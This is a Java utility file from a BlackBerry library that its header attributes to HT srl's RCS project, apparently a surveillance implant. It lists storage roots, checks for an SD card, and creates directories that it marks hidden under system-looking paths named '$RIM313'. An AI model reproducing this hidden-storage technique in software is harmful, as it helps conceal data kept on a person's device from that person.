/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Path.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.fs;

import java.io.IOException;

import java.util.Enumeration;
import java.util.Vector;

import javax.microedition.io.Connector;
import javax.microedition.io.file.FileConnection;
import javax.microedition.io.file.FileSystemRegistry;

import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

import net.rim.device.api.util.StringPattern;

public class Path {
    private static Debug debug = new Debug("Path", DebugLevel.VERBOSE);

    public static String SDPath = "file:///SDCard/BlackBerry/system/$RIM313/";
    public static String UserPath = "file:///store/home/user/$RIM313/";

    public static boolean SDPresent() {
        Enumeration roots = FileSystemRegistry.listRoots();

        while (roots.hasMoreElements()) {
            String path = (String) roots.nextElement();

            if (path.indexOf("SDCard") >= 0) {
                debug.info("SDPresent FOUND: " + path);
                return true;
            } else {
                debug.trace("SDPresent NOT:" + path);
            }
        }

        return false;
    }

    public static Vector GetRoots() {
        Enumeration roots = FileSystemRegistry.listRoots();
        Vector vector = new Vector();

        while (roots.hasMoreElements()) {
            String root = (String) roots.nextElement();
            vector.addElement(root);

            FileConnection fc;

            try {
                fc = (FileConnection) Connector.open("file:///" + root);
                System.out.println(root + " " + fc.availableSize());
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }

        return vector;
    }

    public static void PrintRoots() {
        Enumeration roots = FileSystemRegistry.listRoots();

        while (roots.hasMoreElements()) {
            String root = (String) roots.nextElement();
            FileConnection fc;

            try {
                fc = (FileConnection) Connector.open("file:///" + root);
                System.out.println(root + " " + fc.availableSize());
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
    }

    public static boolean CreateDirectory(String dirName) {
        FileConnection fconn = null;

        try {
            fconn = (FileConnection) Connector.open(dirName,
                    Connector.READ_WRITE);

            if (fconn.exists()) {
                debug.trace("Directory exists");
                return false;
            }

            fconn.mkdir();
            fconn.setHidden(true);

            Check.ensures(fconn.exists(), "Couldn't create dir");

        } catch (IOException e) {

            e.printStackTrace();
            return false;

        } finally {
            if (fconn != null)
                try {
                    fconn.close();
                } catch (IOException e) {

                }
        }

        return true;
    }
}
